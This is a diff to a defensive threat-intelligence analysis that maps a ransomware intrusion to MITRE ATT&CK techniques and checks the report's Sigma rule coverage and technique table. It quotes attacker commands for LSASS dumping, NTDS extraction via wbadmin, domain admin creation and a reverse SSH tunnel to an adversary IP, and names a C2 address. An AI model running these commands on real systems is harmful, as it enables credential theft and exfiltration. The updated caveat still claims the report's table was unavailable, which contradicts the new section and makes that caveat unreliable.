@@ -55,7 +55,7 @@ endpoint security.
 | 10 | Execution | `AdgNsy.exe` (renamed `WAB.exe`) launched via WMI, spawning under `WmiPrvSE.exe` | T1047 Windows Management Instrumentation; T1036.003 Rename Legitimate Utilities |
 | 11 | Stealth | AdaptixC2 shellcode reflectively injected into `AdgNsy.exe`; RWX private regions, unbacked thread entry | T1055 Process Injection |
 | 12 | Command and Control | AdaptixC2 HTTP beacon to `172.96.137[.]160`, default profile | T1071.001 Web Protocols |
-| 13 | Discovery | `systeminfo`, `whoami /groups`, `quser`, `nltest /dclist:`, `nltest /domain_trusts`, `ping`, `net group "domain admins" /dom`, `dir C:\programdata` | T1082, T1033, T1087.002, T1069.002, T1482, T1018, T1083 |
+| 13 | Discovery | `systeminfo`, `whoami /groups`, `quser`, `nltest /dclist:`, `nltest /domain_trusts`, `ping`, `net group "domain admins" /dom`, `net localgroup administrators`, `net accounts`, `dir C:\programdata` | T1082, T1033, T1087.001, T1087.002, T1069.001, T1069.002, T1482, T1018, T1083 |
 | 14 | Discovery | Port scan from the beacon (SMB/RDP/LDAP); later SoftPerfect `n.exe` | T1046 Network Service Discovery |
 | 15 | Persistence | `net user backup_DA/backup_EA ... /add /dom` | T1136.002 Domain Account |
 | 16 | Privilege Escalation | `net group "enterprise admins" backup_EA /add /dom` | T1098.007 Additional Local or Domain Groups |
@@ -64,7 +64,7 @@ endpoint security.
 | 19 | Lateral Movement | RDP from beachhead to DC and backup server using `backup_EA`; nine accounts rotated | T1021.001 Remote Desktop Protocol |
 | 20 | Credential Access | `wbadmin.exe start backup` staging `ntds.dit` + SYSTEM/SECURITY hives to `C:\ProgramData` | T1003.003 NTDS |
 | 21 | Credential Access | `psql.exe` query on Veeam PostgreSQL, run 4× including once via WMI + encoded PowerShell; DPAPI decryption | T1555 Credentials from Password Stores; T1059.001 PowerShell |
-| 22 | Credential Access | `lsassy` — `rundll32 comsvcs.dll MiniDump` across 3 hosts via SMB → WMI → scheduled task → DCOM in ~50s | T1003.001 LSASS Memory; T1021.002 SMB/Windows Admin Shares; T1053.005 Scheduled Task; T1021.003 Distributed Component Object Model |
+| 22 | Credential Access | `lsassy` — `rundll32 comsvcs.dll MiniDump` across 3 hosts via SMB → WMI → scheduled task → DCOM in ~50s | T1003.001 LSASS Memory; T1021.002 SMB/Windows Admin Shares; T1569.002 Service Execution; T1053.005 Scheduled Task; T1021.003 Distributed Component Object Model |
 | 23 | Discovery | SPN enumeration script → `spn.txt`; `Invoke-ShareFinder`; `Get-ADComputer`/`Get-ADUser` exports; `Export-DnsServerZone` | T1135 Network Share Discovery; T1087.002 Domain Account; T1018 Remote System Discovery |
 | 24 | Collection | Automated sweep for DPAPI keys, RSA keys, Credential Manager, browser profiles, AWS/GCP/Azure creds, nine password managers, source repos, mRemoteNG configs (Event ID 5145) | T1119 Automated Collection; T1555.003, T1555.004, T1555.005; T1552.001, T1552.004; T1039 Data from Network Shared Drive |
 | 25 | Command and Control | `ssh root@193.242.184[.]150 -R *:10400 -p22` from the DC, bridging local 3389 | T1572 Protocol Tunneling; T1090.002 External Proxy |
@@ -201,12 +201,199 @@ The chain offers at least four high-confidence detections (1-4) in the twenty
 hours before encryption. This intrusion was loud; the failure mode was not
 subtlety.
 
+## Sigma coverage vs. the chain
+
+The report ships 34 Sigma repo rules plus 4 from the DFIR Report private
+ruleset. Diffing them against the 32-step chain shows where the published
+detection actually sits.
+
+### Well covered
+
+| Chain step | Rules |
+|---|---|
+| 13 Discovery | `Whoami Utility Execution`, `Group Membership Reconnaissance Via Whoami.EXE`, `Suspicious Execution of Systeminfo`, `Nltest.EXE Execution`, `Potential Recon Activity Via Nltest.EXE`, `Net.EXE Execution`, `Suspicious Group And Account Reconnaissance Activity Using Net.EXE`, `Local Accounts Discovery` |
+| 15, 18 Account creation/manipulation | `New User Created Via Net.EXE`, `Suspicious Manipulation Of Default Accounts Via Net.EXE` |
+| 22 LSASS dumping | `Process Memory Dump Via Comsvcs.DLL`, `Uncommon Process Access Rights For Target Image`, `PowerShell Get-Process LSASS in ScriptBlock`, `MMC Spawning Windows Shell`, `CMD Shell Output Redirect`, `Potentially Suspicious CMD Shell Output Redirect`, `Read Contents From Stdin Via Cmd.EXE` |
+| 10, 21 WMI execution | `Suspicious WmiPrvSE Child Process`, `WmiPrvSE Spawned A Process`, `Potential WMI Lateral Movement WmiPrvSE Spawned PowerShell` |
+| 21, 30 Encoded PowerShell | `Suspicious Encoded PowerShell Command Line`, `Suspicious PowerShell Encoded Command Patterns`, `PowerShell Base64 Encoded FromBase64String Cmdlet`, `Suspicious Execution of Powershell with Base64`, `Unusually Long PowerShell CommandLine` |
+| 4 MSI delivery | `MSI Installation From Suspicious Locations` |
+| 32 Shadow copy deletion | `Delete Volume Shadow Copies Via WMI With PowerShell` |
+
+The `lsassy` step is the best-covered part of the chain — seven rules fire on
+it, because each of its four execution methods leaves its own trace.
+
+### Not covered by the listed rules
+
+Ranked by what it costs to miss them:
+
+1. **`wbadmin.exe` NTDS extraction (step 20).** No rule. This was the
+   highest-value detection in the chain — a unique command line, twenty hours
+   before encryption. The private ruleset covers Veeam, DNS zone enumeration,
+   LSASS correlation, and DGA, but not this. Sigma repo has `ntdsutil` and
+   shadow-copy-based NTDS rules; none are cited here, suggesting the `wbadmin`
+   variant slipped past.
+2. **Reverse SSH tunnel (step 25).** No rule for `ssh.exe` with `-R`. A domain
+   controller opening an outbound SSH session is nearly free to detect and
+   preceded both the SYSVOL exfil and the RDP proxy.
+3. **Bulk SFTP exfiltration (steps 26, 28).** Nothing host-side, and the ET
+   network rules cover Bumblebee C2 and RustDesk DNS but not the 77 GB egress.
+   Two 4.5-hour, ~40 GB sessions to one host left no detection.
+4. **Ransomware execution itself (step 31).** No rule for `locker.exe -p= -n=`
+   or the 39 repeat executions on the child DC. Only the shadow copy deletion
+   one second later is covered — forensic, not preventive.
+5. **RustDesk / cloudflared service installation (step 17).** Only
+   `DNS Query To Remote Access Software Domain From Non-Browser App`, which is
+   network-side and after the fact. No service-creation rule, despite
+   `RustDesk.exe --cm` after a Type 2 logon from `127.0.0.1` being a clean
+   signal.
+6. **Automated credential-store sweep (step 24).** The Event ID 5145 pattern —
+   DPAPI keys, nine password managers, AWS/GCP/Azure credential paths in rapid
+   succession — has no rule, despite being the most distinctive collection
+   behavior in the intrusion.
+7. **BYOVD driver service registration** (Swisscom). No rule for `rwdrv.sys` /
+   `hlpdrv.sys` registered as services from `%TEMP%`.
+8. **DLL side-loading (step 6).** The report's prose says
+   *System File Execution Location Anomaly* fired, but that rule is not in the
+   published list.
+9. **Network scanning (step 14)** — beacon port scan and SoftPerfect `n.exe`.
+
+The distribution is telling: roughly two-thirds of the rules fire on discovery,
+shell, and PowerShell activity — cheap, noisy, early-stage — while the
+credential-access → tunnel → exfil → encrypt spine, where the damage actually
+happened, is covered at three points out of nine.
+
+### Rules implying activity the narrative never describes
+
+Four rules have no counterpart in the report's prose. Each one is a behavior
+worth chasing:
+
+- **`Pass the Hash Activity 2`** → **T1550.002 Pass the Hash**. Never mentioned
+  in the narrative. Plausible given the LSASS dumps and nine rotated accounts,
+  but undocumented — and it would change the lateral-movement story from
+  "RDP with known passwords" to something quieter.
+- **`DPAPI Domain Backup Key Extraction`** → the narrative only describes DPAPI
+  used locally to decrypt Veeam credentials. Extracting the *domain backup key*
+  is a forest-wide capability: it decrypts any domain user's DPAPI secrets,
+  indefinitely, and survives password resets. That is materially larger than
+  what the prose describes and it is not in the chain narrative at all.
+  Enterprise ATT&CK has **no dedicated DPAPI technique**; the closest fits are
+  **T1552.004 Private Keys** and **T1555.004 Windows Credential Manager**.
+- **`Startup Folder File Write`** → **T1547.001 Registry Run Keys / Startup
+  Folder**. A persistence mechanism the report never discusses; its persistence
+  section covers only domain accounts, services, and account manipulation.
+- **`Local Accounts Discovery`** → **T1087.001 Local Account**, complementing
+  the domain-level enumeration mapped at step 13.
+
+Also add **T1140 Deobfuscate/Decode Files or Information** for the
+`FromBase64String` handling that four of the PowerShell rules key on.
+
+Recovery advice: for an incident scoped from this report, treat the DPAPI
+domain backup key as **presumed compromised** until ruled out. If it was taken,
+credential rotation alone does not close it.
+
+## The report's own ATT&CK table
+
+The report publishes 38 techniques. Validated against v19.1:
+
+```bash
+python3 util/attack_lookup.py validate T1136 T1555 T1486 ... T1027.010
+```
+
+**All 38 resolve cleanly — none deprecated, none revoked.** The v19 traps
+predicted above did not materialize, but not because the table accounts for
+them: the BYOVD activity that would have needed T1562.001 simply is not mapped
+at all. The table is current because of what it omits, not because it tracks
+the revocation.
+
+### Where the table is less specific than the evidence supports
+
+| Table | Evidence supports | Why |
+|---|---|---|
+| T1136 Create Account | **T1136.002 Domain Account** | `net user backup_DA ... /add /dom` — the `/dom` flag is explicit |
+| T1036 Masquerading | **T1036.005** + **T1036.003** | `consent.exe` relocated to `%TEMP%` (.005) and `WAB.exe` renamed to `AdgNsy.exe` (.003) |
+| T1090 Proxy | **T1090.002 External Proxy** | The tunnel endpoint `193.242.184[.]150` is adversary-controlled and external |
+| T1219 Remote Access Tools | **T1219.002 Remote Desktop Software** | RustDesk is squarely the RDP-software sub-technique |
+
+### Where the table is wrong
+
+**T1048.001 Exfiltration Over Symmetric Encrypted Non-C2 Protocol** should be
+**T1048.002** (asymmetric). ATT&CK reserves `.001` for adversaries who
+implement their own symmetric crypto with manually shared keys (RC4, AES)
+layered over a protocol. The report's own Zeek evidence shows
+`SSH-2.0-FileZilla_3.68.1` negotiating with `SSH-2.0-OpenSSH_for_Windows_9.8`
+— asymmetric key exchange baked into the protocol, which is `.002` by
+definition. Confirm with:
+
+```bash
+python3 util/attack_lookup.py technique T1048.001 T1048.002 --full
+```
+
+### Where the table caught things this analysis missed
+
+Three genuine corrections to the chain above:
+
+- **T1569.002 Service Execution** — `lsassy`'s `smbexec` path creates a service
+  via `svcctl`. Mapping only T1021.002 SMB/Windows Admin Shares for that step
+  understates it; both apply.
+- **T1069.001 Local Groups** — the `net localgroup`, `net localgroup
+  administrators`, and `net accounts` sequence on the backup server. The chain
+  above captured only domain-level group discovery (T1069.002).
+- **T1041 Exfiltration Over C2 Channel** — defensible for the ~2.5 GB SYSVOL
+  transfer, if the reverse SSH tunnel is treated as the C2 channel rather than
+  an alternate protocol. Reasonable people map this either way; the table's
+  reading is coherent.
+
+### What the table leaves out
+
+Roughly 30 of the 38 overlap with this analysis, which maps ~66. The
+substantive omissions:
+
+1. **T1608.006 SEO Poisoning.** The report is titled "From Bing Search to
+   Ransomware" and ATT&CK has had a technique for exactly this since v16. Only
+   T1189 Drive-by Compromise is listed, which describes the download but not
+   the search-ranking manipulation that made it work. The single most
+   consequential omission — it is the campaign's distinguishing feature.
+2. **T1572 Protocol Tunneling.** Reverse SSH tunnels appear in *both*
+   intrusions (`ssh -R *:10400`, `ssh -R 5554`), plus cloudflared at Swisscom.
+   The table lists T1090 Proxy only. Proxying and tunneling are different
+   behaviors with different detections — AN1483 keys specifically on `ssh.exe`
+   with forwarding flags.
+3. **The entire BYOVD sequence.** No T1685 Disable or Modify Tools, no T1068
+   Exploitation for Privilege Escalation, for `rwdrv.sys` / `hlpdrv.sys`
+   registered as services by AV-killer utilities.
+4. **T1105 Ingress Tool Transfer** — RustDesk, FileZilla, SoftPerfect `n.exe`,
+   and the vulnerable drivers all entered from outside.
+5. **T1078 Valid Accounts / T1098.007 Additional Local or Domain Groups.**
+   Nine rotated accounts, a reactivated built-in Domain Administrator, and
+   `backup_EA` added to Enterprise Admins — none of it mapped. T1136 Create
+   Account covers creation but not the escalation or the reuse.
+6. **Credential-store sub-techniques.** The 5145 sweep across browsers,
+   nine password managers, cloud credential paths, DPAPI keys, and RSA private
+   keys is covered only by parent T1555. T1555.003, T1555.004, T1555.005,
+   T1552.001, and T1552.004 all have direct evidence.
+7. **Two of `lsassy`'s four execution methods.** T1021.003 DCOM and T1569.002
+   Service Execution are listed; T1053.005 Scheduled Task and T1021.002
+   SMB/Windows Admin Shares are not, though the report names all four.
+8. **T1489 Service Stop** — the Swisscom `wmic ... ChangeStartmode Disabled`
+   and process deletion against SQL and IIS before encryption.
+9. **Collection and staging** — T1119 Automated Collection, T1074.001 Local
+   Data Staging (`C:\ProgramData`), T1005 Data from Local System.
+
+The pattern: the table is strong on discovery and execution, and thin on
+resource development, tunneling, privilege escalation, and the Swisscom
+intrusion generally — the second case contributes almost nothing to it despite
+being a third of the report's content.
+
 ## Gaps and caveats
 
-- Everything above is from the report text. The report's own ATT&CK mapping
-  table was not included in what was provided, so there was nothing of theirs
-  to validate — the v19 issues flagged above are predictions about that table,
-  based on the tactic names used in the prose.
+- Everything above is from the report text and its detection lists. The
+  report's own ATT&CK mapping table was not among the sections provided, so
+  there was nothing of theirs to validate — the v19 issues flagged above are
+  predictions about that table, based on the tactic names used in the prose.
+- The four techniques added from the Sigma list (T1550.002, T1547.001,
+  T1087.001, T1140) are inferred from rule names, not from described behavior.
+  A rule appearing in a report's detection list usually means it fired, but the
+  report does not say so explicitly.
 - The Veeam PostgreSQL dump maps cleanly to T1555 Credentials from Password
   Stores at the parent level; no sub-technique covers backup-application
   credential databases specifically.
